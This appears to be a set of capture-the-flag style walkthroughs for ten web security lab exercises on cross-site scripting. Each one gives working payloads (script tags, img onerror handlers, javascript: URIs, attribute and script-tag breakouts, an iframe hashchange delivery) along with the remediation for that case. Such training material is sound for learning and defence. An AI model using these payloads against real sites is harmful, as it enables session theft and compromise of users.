### [PS-XSS-01] Reflected XSS into HTML context with nothing encoded

**Scenario:** The application's search function accepts user input via a URL query parameter and reflects it directly into the HTML response body without any sanitization or output encoding, allowing an attacker to execute arbitrary JavaScript in the victim's browser.

**Solution:**

1. Input a standard XSS payload into the search box on the home page and submit the search query.
2. Intercept or view the resulting HTTP request in Burp Repeater:

```http
GET /?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: target.web-security-academy.net

```

3. Inspect the server's HTML response to confirm that the input is reflected raw inside the body context:

```html
<h1>0 search results for '<script>alert(1)</script>'</h1>

```

4. Render the page in a browser to confirm that the script executes and triggers the `alert(1)` pop-up.

> **Key Takeaway:** Reflected XSS in HTML context occurs when untrusted user input is echoed directly into the HTML response stream without context-aware output encoding. All user-supplied data reflected in HTML must undergo context-appropriate encoding (such as converting `<` to `&lt;` and `>` to `&gt;`).

---

### [PS-XSS-02] Stored XSS into HTML context with nothing encoded

**Scenario:** The application's blog comment functionality stores user input directly in a database and renders it into the HTML body context when the blog post is viewed. Because no sanitization or output encoding is performed, the injected script persists on the server and automatically executes in the browser of anyone who views the comment.

**Solution:**

1. Navigate to any blog post on the target site.
2. Scroll to the **Leave a comment** section at the bottom of the page.
3. Enter an XSS payload in the **Comment** text area:

```html
<script>alert(1)</script>

```

4. Fill in the required **Name**, **Email**, and **Website** fields with arbitrary values.
5. Click **Post comment**.
6. Click **Back to blog** or reload the blog post page. The application fetches the stored comment from the database and executes the script, triggering the `alert(1)` pop-up.

> **Key Takeaway:** Stored (persistent) XSS is self-contained within the web application and executes automatically whenever a victim encounters the stored data. All user-controlled input stored in persistent storage must undergo strict context-appropriate encoding (such as HTML entity encoding) before being rendered back to users.

---

### [PS-XSS-03] DOM XSS in document.write sink using source location.search

**Scenario:** The application contains a DOM-based cross-site scripting vulnerability in its search functionality. Client-side JavaScript retrieves data from an untrusted source (`location.search`) and passes it directly into a dangerous sink (`document.write`) without sanitization or escaping.

**Solution:**

1. Enter an arbitrary search string (e.g., `test`) in the search box on the home page.
2. Open Browser Developer Tools (F12) or inspect the page source to analyze how the search query is handled client-side.
3. Locate the inline script executing the search tracking logic:

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if (query) {
    trackSearch(query);
}

```

4. Observe that `query` is taken directly from the `search` parameter in `location.search` and interpolated inside an `<img>` tag written via `document.write()`.
5. Craft a payload to break out of the `src` attribute and `<img>` tag, then execute arbitrary JavaScript:

```html
"><script>alert(1)</script>

```

6. Submit the payload in the search box or append it to the query string in the browser address bar:

```http
GET /?search=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: target.web-security-academy.net

```

7. When the script evaluates, `document.write()` outputs `<img src="/resources/images/tracker.gif?searchTerms="><script>alert(1)</script>">`, triggering the `alert(1)` pop-up.

> **Key Takeaway:** DOM XSS occurs entirely within the client-side browser environment when untrusted attacker-controlled sources (such as `location.search`, `location.hash`, or `document.referrer`) reach execution sinks like `document.write()`, `innerHTML`, or `eval()`. Safe development practices require avoiding dynamic code evaluation sinks and utilizing safer DOM manipulation methods such as `textContent` or `createElement()`.

---

### [PS-XSS-04] DOM XSS in innerHTML sink using source location.search

**Scenario:** The application processes user-supplied search queries client-side by assigning data retrieved from `location.search` directly into an `innerHTML` sink. Because `innerHTML` does not execute `<script>` tags in modern browsers (per HTML5 spec), an attacker must use an element with an inline event handler (such as `<img src=x onerror=alert(1)>`) to achieve code execution.

**Solution:**

1. Submit an arbitrary search query (e.g., `test`) on the blog page.
2. Open Browser Developer Tools (F12) and inspect the search results element to analyze the client-side JavaScript:

```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if (query) {
    doSearchQuery(query);
}

```

3. Note that `query` is taken directly from the URL's `search` parameter (`location.search`) and written to the DOM via `.innerHTML`.
4. Craft an XSS payload using an `<img>` tag with an invalid `src` and an `onerror` event handler:

```html
<img src=x onerror=alert(1)>

```

5. Submit the payload into the search box or append it directly to the URL query string:

```http
GET /?search=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E HTTP/1.1
Host: target.web-security-academy.net

```

6. The JavaScript assigns the payload to `innerHTML`, inserting the `<img>` element into the page. When the browser attempts to load image source `x`, it fails and fires the `onerror` event, triggering the `alert(1)` pop-up.

> **Key Takeaway:** Assigning untrusted input to an `innerHTML` sink allows DOM XSS. Even though modern browsers block standard `<script>` tag execution when inserted via `innerHTML`, attackers easily bypass this by leveraging inline event handlers like `onerror` or `onload`. Use safer properties like `textContent` or `innerText` to safely render user text.

---

### [PS-XSS-05] DOM XSS in jQuery anchor href attribute sink using location.search

**Scenario:** The application uses jQuery to dynamically populate the `href` attribute of a back link on the feedback page using a query parameter (`returnPath`) extracted directly from `location.search`. Because the URL scheme is not validated, an attacker can pass a `javascript:` pseudo-protocol URL into the parameter, causing arbitrary code to execute when a user clicks the link.

**Solution:**

1. Navigate to the **Submit feedback** page on the target site.
2. Open Browser Developer Tools (F12) and inspect the page source code handling the back link:

```javascript
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});

```

3. Observe that jQuery's `.attr("href", ...)` function assigns the `returnPath` parameter from `location.search` directly to the `href` attribute of the element with ID `backLink`.
4. Construct an XSS payload leveraging the `javascript:` URI scheme:

```text
javascript:alert(1)

```

5. Append the payload to the `returnPath` parameter in the browser address bar:

```http
GET /feedback?returnPath=javascript:alert(1) HTTP/1.1
Host: target.web-security-academy.net

```

6. Inspect the generated anchor tag in the DOM to confirm its update:

```html
<a id="backLink" href="javascript:alert(1)">Back</a>

```

7. Click the **Back** link on the page. The browser executes the inline JavaScript protocol, triggering the `alert(1)` pop-up.

> **Key Takeaway:** Assigning untrusted user input directly to URL-accepting attributes (`href`, `src`, `action`) creates DOM XSS risks via the `javascript:` pseudo-protocol. To mitigate this, client-side code must enforce strict URL validation—ensuring links start with explicit, safe schemes (`https://`, `http://`) or relative path slashes (`/`) before dynamically inserting them into the DOM.

---

### [PS-XSS-06] DOM XSS in jQuery selector sink using a hashchange event

**Scenario:** The application uses a vulnerable pattern where the jQuery selector function `$()` acts as a DOM execution sink. An event listener bound to the `hashchange` event reads user input from `location.hash` and passes it directly into `$()`. When an attacker delivers a payload via a crafted URL or iframe, jQuery interprets the payload string as HTML elements rather than a CSS selector, executing arbitrary JavaScript.

**Solution:**

1. Open Browser Developer Tools (F12) or view the home page source code to locate the `hashchange` event handler:

```javascript
$(window).on('hashchange', function() {
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post.length) {
        post[0].scrollIntoView();
    }
});

```

2. Observe that `window.location.hash` is decoded and concatenated inside the `$()` selector function. In vulnerable jQuery implementations, passing HTML tags into `$()` causes jQuery to instantiate those DOM elements and execute inline scripts or handlers.
3. Access the lab's **Exploit Server**.
4. In the **Body** text area of the exploit server, craft an `<iframe>` payload that loads the vulnerable site home page and then updates the `src` attribute hash to trigger the `hashchange` event:

```html
<iframe src="https://target.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

```

5. Click **Store** and then **Deliver exploit to victim**.
6. When the victim visits the link, the `<iframe>` initially loads the target URL with an empty hash `#`. Once loaded, the `onload` handler appends `<img src=x onerror=print()>` to `this.src`, firing the `hashchange` event. jQuery receives the image payload in `$()`, causing the browser to render the broken image tag and execute `print()`.

> **Key Takeaway:** Passing untrusted user input (such as `location.hash`) into jQuery's `$()` selector function is dangerous because jQuery attempts to parse strings starting with `<` as HTML DOM elements rather than CSS query selectors. Input passed to selectors must be sanitized, strictly validated, or handled using specific DOM selection methods like `Element.querySelector()` rather than overloaded library wrappers.

---

### [PS-XSS-07] Reflected XSS into attribute with angle brackets HTML-encoded

**Scenario:** The application reflects user search queries inside the `value` attribute of an HTML `<input>` tag. While the application HTML-encodes angle brackets (`<` and `>`) to prevent tag creation, it fails to encode double quotes (`"`). This allows an attacker to break out of the attribute string and inject new HTML attributes, such as an event handler (`onfocus`) combined with `autofocus` to execute JavaScript without user interaction.

**Solution:**

1. Enter an arbitrary search string (e.g., `test`) in the search box on the home page.
2. Inspect the search input element in Browser Developer Tools (F12) to observe how input reflects:

```html
<input type="text" name="search" value="test">

```

3. Test if double quotes are preserved by searching for `"test`. Inspecting the page DOM confirms the quote is rendered unescaped inside the tag:

```html
<input type="text" name="search" value=""test">

```

4. Craft an XSS payload that closes the `value` attribute and introduces an event handler along with `autofocus` to execute code automatically upon page load:

```html
" onfocus="alert(1)" autofocus="

```

5. Submit the payload in the search field or append it to the query parameter:

```http
GET /?search=%22+onfocus%3D%22alert%281%29%22+autofocus%3D%22 HTTP/1.1
Host: target.web-security-academy.net

```

6. Inspect the resulting HTML markup rendered by the server:

```html
<input type="text" name="search" value="" onfocus="alert(1)" autofocus="">

```

7. When the page loads, `autofocus` automatically places cursor focus on the `<input>` element, triggering `onfocus` and executing `alert(1)`.

> **Key Takeaway:** Sanitization must be context-aware. When reflecting user input inside HTML attributes, encoding angle brackets is ineffective against attribute breakout. Attribute values must have quotes HTML-encoded (e.g., `"` converted to `&quot;` and `'` to `&#x27;`) to prevent attackers from introducing new attributes or event handlers.

---

### [PS-XSS-08] Stored XSS into anchor href attribute with double quotes HTML-encoded

**Scenario:** The application allows users to submit comments with a website URL, which is stored in the database and rendered inside the `href` attribute of an `<a>` tag wrapping the commenter's name. The application HTML-encodes double quotes (`"`), preventing an attacker from breaking out of the attribute. However, because the value is directly inserted into a URL context, an attacker can leverage the `javascript:` pseudo-protocol without needing quotes or angle brackets.

**Solution:**

1. Navigate to any blog post on the target site and locate the **Leave a comment** form.
2. Fill in the **Comment**, **Name**, and **Email** fields with arbitrary test data.
3. In the **Website** field, input the following URI payload:

```text
javascript:alert(1)

```

4. Click **Post comment** and return to the blog post.
5. Inspect the comment author's link in Browser Developer Tools (F12) to verify how the payload was rendered:

```html
<a id="author" href="javascript:alert(1)">Commenter Name</a>

```

6. Click the author's name link. The browser evaluates the `javascript:` pseudo-protocol, executing the script and triggering the `alert(1)` pop-up.

> **Key Takeaway:** Encoding double quotes (`&quot;`) prevents attribute breakout, but it fails to secure URL-accepting attributes like `href` or `src`. To prevent XSS in URL contexts, applications must validate that user-supplied input uses safe schemes (`http://`, `https://`) or relative path slashes (`/`) before rendering them into the DOM.

---

### [PS-XSS-09] Reflected XSS into a JavaScript string with angle brackets HTML-encoded

**Scenario:** The application reflects the user's search query directly inside a JavaScript string literal within an inline `<script>` tag. Although angle brackets (`<` and `>`) are HTML-encoded by the server—preventing an attacker from closing the `<script>` tag—single quotes (`'`) are left unescaped. This allows an attacker to terminate the string literal, introduce custom JavaScript commands, and execute arbitrary code.

**Solution:**

1. Perform a search for an arbitrary string (e.g., `test`) on the home page.
2. View the page source or inspect the HTTP response in Burp Repeater to locate where the search term reflects inside an inline `<script>` block:

```javascript
<script>
    var searchTerms = 'test';
</script>

```

3. Craft an XSS payload using a single quote (`'`) to terminate the string, a semicolon (`;`) to end the assignment statement, the payload function, and line comment markers (`//`) to neutralize the trailing single quote:

```javascript
';alert(1)//

```

4. Submit the payload via the search field or query parameter:

```http
GET /?search=%27%3Balert%281%29%2F%2F HTTP/1.1
Host: target.web-security-academy.net

```

5. Inspect the server's HTML response to confirm how the script parses:

```javascript
<script>
    var searchTerms = '';alert(1)//';
</script>

```

6. Render the page in the browser. The JavaScript engine closes the `searchTerms` variable assignment, executes `alert(1)`, and ignores the remainder of the original statement due to the comment (`//`).

> **Key Takeaway:** Standard HTML entity encoding (such as converting `<` to `&lt;`) provides zero protection when user input reflects inside a JavaScript context. To safely handle dynamic values inside scripts, applications must use JavaScript-specific escaping (e.g., Unicode escaping like `\x27` for quotes), serialize data using JSON, or pass data via HTML `data-*` attributes rather than direct script interpolation.

---

### [PS-XSS-10] Reflected XSS into a JavaScript string with single quote and backslash escaped

**Scenario:** The application reflects user input inside a JavaScript string literal within an inline `<script>` block. The server escapes both single quotes (`'`) and backslashes (`\`), preventing attackers from terminating the string or escaping the quote handler. However, because the reflection occurs directly within inline HTML `<script>` tags, the browser's HTML parser processes tag boundaries before the JavaScript engine executes the code. An attacker can close the entire script element using `</script>` and inject a new HTML/JavaScript context.

**Solution:**

1. Submit a search query with test characters (e.g., `test'\"`) on the home page.
2. View the page source or inspect the response in Burp Repeater to observe how single quotes and backslashes are escaped:

```javascript
<script>
    var searchTerms = 'test\'\\\"';
</script>

```

3. Craft an XSS payload that ignores the JavaScript string syntax completely and targets the HTML element boundary by closing the inline `<script>` tag:

```html
</script><script>alert(1)</script>

```

4. Submit the payload via the search field or query parameter:

```http
GET /?search=%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
Host: target.web-security-academy.net

```

5. Inspect the server's HTML response to confirm how the browser receives the markup:

```html
<script>
    var searchTerms = '</script><script>alert(1)</script>';
</script>

```

6. Render the page in the browser. The HTML parser encounters `</script>` inside the string literal, immediately terminates the first script element, and then parses and executes the subsequent `<script>alert(1)</script>` block.

> **Key Takeaway:** HTML parsing takes precedence over JavaScript parsing for inline script blocks. Escaping JavaScript-specific characters (like quotes and backslashes) is ineffective if an attacker can introduce HTML tag delimiters. To remediate this, applications must HTML-encode angle brackets (`<` and `>`) when reflecting input inside inline script tags, or ideally load dynamic values via dedicated data attributes or JSON APIs.